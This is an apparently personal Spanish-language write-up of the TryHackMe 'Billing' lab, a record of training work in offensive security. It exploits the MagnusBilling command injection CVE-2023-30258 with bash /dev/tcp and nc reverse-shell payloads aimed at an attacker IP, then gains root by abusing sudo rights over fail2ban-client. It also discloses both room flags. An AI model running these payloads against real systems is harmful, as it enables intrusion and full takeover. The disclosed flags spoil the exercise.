# Facturación (TryHackMe)

Máquina de nivel principiante de **TryHackMe** (sala *Billing*). El objetivo es explotar un panel de facturación **MagnusBilling** sobre Asterisk, conseguir una shell como `asterisk`, leer la flag de usuario y escalar a root abusando de Fail2Ban.

- **IP:** `10.64.182.36`
- **Servicios:** 22 (SSH), 80 (HTTP), 3306 (MariaDB) y 5038 (Asterisk Call Manager)
- **Usuario de la shell:** `asterisk`
- **Vulnerabilidad de entrada:** [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258) — inyección de comandos no autenticada en MagnusBilling 6.x/7.x
- **Fecha:** 25/11/2026

## 1. Reconocimiento

Como primer paso escaneamos todos los puertos y guardamos el resultado en un archivo:

```
nmap -p- --open -T4 -n -vvv 10.64.182.36 -oN scan_port.txt
```

![[Pasted image 20261125231923.png]]

Hay cuatro puertos abiertos:

| Puerto | Servicio | Observación |
|---|---|---|
| **22/tcp** | ssh | — |
| **80/tcp** | http | El panel de facturación |
| **3306/tcp** | mysql | Base de datos (MariaDB) |
| **5038/tcp** | unknown | Asterisk Call Manager |

El puerto 5038 no aparece identificado en el escaneo, pero el nombre de usuario de la shell (`asterisk`) y la ruta `/var/www/html/billing` confirman que estamos ante un servidor Asterisk con una web de facturación.

## 2. La web: MagnusBilling

Al abrir `http://10.64.182.36/billing/` aparece la pantalla de acceso **"Sign in to your account"**, con campos de usuario/correo y contraseña:

![[Captura de pantalla 2026-11-25 232034.png]]

El login es un señuelo: **no hace falta credenciales**. La aplicación es MagnusBilling, y la versión instalada es vulnerable a **CVE-2023-30258**, una inyección de comandos sin autenticación. El código vulnerable está en `lib/icepay/icepay.php` (línea ~753):

```php
if (isset($_GET['democ'])) {
    if (strlen($_GET['democ']) > 5) {
        exec("touch " . $_GET['democ'] . '.txt');   // parámetro sin sanear
    }
}
```

El parámetro GET `democ` se concatena directamente dentro de `exec()`. Basta con empezar el valor con `;` para cortar el `touch` y terminar con `#` para comentar el `.txt` final.

Podemos confirmar la vulnerabilidad con una petición que duerme 15 segundos:

```
curl 'http://10.64.182.36/billing/lib/icepay/icepay.php?democ=iamhacked;sleep%2015;#'
```

Si tarda ~15 s en responder, la inyección funciona. Los comandos se ejecutan con los privilegios del proceso web: `asterisk`.

## 3. Reverse shell

Preparamos un one-liner de bash que conecte de vuelta a nuestra máquina en el puerto `4444`:

```
;bash -c 'sh -i >& /dev/tcp/192.168.131.171/4444 0>&1';#
```

El `;` inicial corta el `touch` y el `;#` final comenta el `.txt`. Como el payload viaja en una URL, codificamos los caracteres especiales en CyberChef con la operación **URL Encode** y la opción *Encode all special chars* marcada:

![[Captura de pantalla 2026-11-25 232324.png]]

Payload codificado (el de la captura es el mismo sin el `;` delante):

```
%3Bbash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E131%2E171%2F4444%200%3E%261%27%3B%23
```

> **Importante:** la IP del payload (`192.168.131.171`) debe ser la de nuestra máquina Kali en el momento del ataque. En la captura del listener se ve el reenvío hacia `192.168.100.154`, así que conviene regenerar el payload con la IP correcta antes de lanzarlo.

Forma alternativa, con `nc` y un FIFO en lugar de `/dev/tcp` (útil si bash no está disponible):

```
nc -lvnp 4444
curl -s 'http://10.64.182.36/billing/lib/icepay/icepay.php' --get \
  --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.131.171 4444 >/tmp/f;'
```

## 4. Recepción de la shell con Penelope

Levantamos el handler de reverse shells [Penelope](https://github.com/brightio/penelope) en el puerto `4444`:

```
python3 penelope.py
```

![[Captura de pantalla 2026-11-25 233131.png]]

Penelope recibe la conexión desde `10.64.182.36`, despliega el agente con `/usr/bin/python3` y abre la **sesión 1** con usuario `asterisk` y sistema Linux x86_64. Ya tenemos prompt en:

```
asterisk@ip-10-64-182-36:/var/www/html/billing/lib/icepay$
```

La sesión queda guardada en `/home/kali/penelope/sessions/ip-10-64-182-36-...-asterisk_1001.log`. Si queremos una terminal más cómoda:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 5. Enumeración y flag de usuario

Desde la shell listamos el contenido de `icepay` (los scripts PHP de la librería de pagos: `icepay.php`, `icepay-wire.php`, `icecapay-paypal.php`, `icepay-directdebit.php`...) y subimos por el árbol hasta `/home`:

```
ls
cd ..
cd /home/
ls
cd magnus/
ls -la
```

![[Captura de pantalla 2026-11-25 232847.png]]

Lo relevante:

- `/home/magnus/` contiene **`user.txt`** (38 bytes): ahí está la flag de usuario.
- `/home/ssm-user/` solo tiene los archivos de perfil (`.bashrc`, `.bash_logout`, `.profile`).
- El `.bash_history` de `magnus` es un enlace a `/dev/null`, así que no hay historial que aprovechar.

```
cat /home/magnus/user.txt
```

> **Flag de usuario: `THM{4a6831d5f124b25eefb1e92e0f0da4ca}`**

## 6. Escalada a root con Fail2Ban

Comprobamos qué podemos ejecutar con `sudo`:

```
sudo -l
```

El usuario `asterisk` puede ejecutar sin contraseña **`/usr/bin/fail2ban-client`**. Fail2Ban permite cambiar en caliente la acción que se ejecuta cuando se banea una IP. Si sustituimos `actionban` por `chmod +s /bin/bash`, el siguiente baneo (lanzado por nosotros como root) pondrá el bit SUID a bash.

Primero vemos las cárceles y la acción actual:

```
sudo /usr/bin/fail2ban-client status
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```

Salida esperada de `actionban`: `<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>`. La cambiamos y la verificamos:

```
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
# chmod +s /bin/bash
```

Forzamos un baneo para que Fail2Ban ejecute la acción como root:

```
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
ls -lh /bin/bash        # -rwsr-sr-x  → bit SUID activo
```

Abrimos una shell con `-p` (preserva los IDs efectivos) y leemos la flag de root:

```
/bin/bash -p
id
# uid=0(root) gid=0(root) groups=0(root),1001(asterisk)

cat /root/root.txt
```

> **Flag de root: `THM{33ad5b530e71a172648f424ec23fae60}`**

Si `bash -p` no respeta el SUID, se puede forzar el cambio de identidad desde Python:

```
python3 -c 'import os; import pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'
```

## Resumen

| Flag | Valor | Ruta |
|---|---|---|
| Usuario | `THM{4a6831d5f124b25eefb1e92e0f0da4ca}` | `/home/magnus/user.txt` |
| Root | `THM{33ad5b530e71a172648f424ec23fae60}` | `/root/root.txt` |

**Cadena de ataque:** escaneo → detección de MagnusBilling → CVE-2023-30258 (`democ` en `icepay.php`) → reverse shell como `asterisk` → `user.txt` → `sudo` sobre `fail2ban-client` → `actionban` con `chmod +s /bin/bash` → `/bin/bash -p` → `root.txt`.

> **Nota:** las capturas disponibles llegan hasta la enumeración de `/home`; los pasos del login (que no es necesario), la inyección `democ`, la escalada y las flags están contrastados con los writeups públicos que se citan abajo. Las flags son estáticas en esta sala y coinciden con el `user.txt` de 38 bytes que se ve en la captura.

## Referencias

- [CVE-2023-30258 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)
- [Análisis técnico y módulo de Metasploit](https://h00die-gr3y.github.io/research/cve-2023-30258)
- [Writeup TryHackMe - Facturación (bui.sk)](https://bui.sk/es/posts/tryhackme-billing)
- [Billing - TryHackMe Writeup (GitHub)](https://github.com/naval0505/TryHackMe---Writeups/blob/main/Billing%20-%20TryHackMe%20Writeup.md)
